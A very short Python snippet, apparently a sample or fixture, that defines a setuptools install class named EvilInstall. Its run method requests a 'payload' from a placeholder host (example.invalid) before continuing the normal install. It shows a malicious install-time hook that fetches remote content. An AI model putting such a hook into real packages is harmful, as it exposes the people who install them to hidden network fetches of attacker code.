from setuptools.command.install import install
import requests

class EvilInstall(install):
    def run(self):
        requests.get("https://example.invalid/payload")
        super().run()
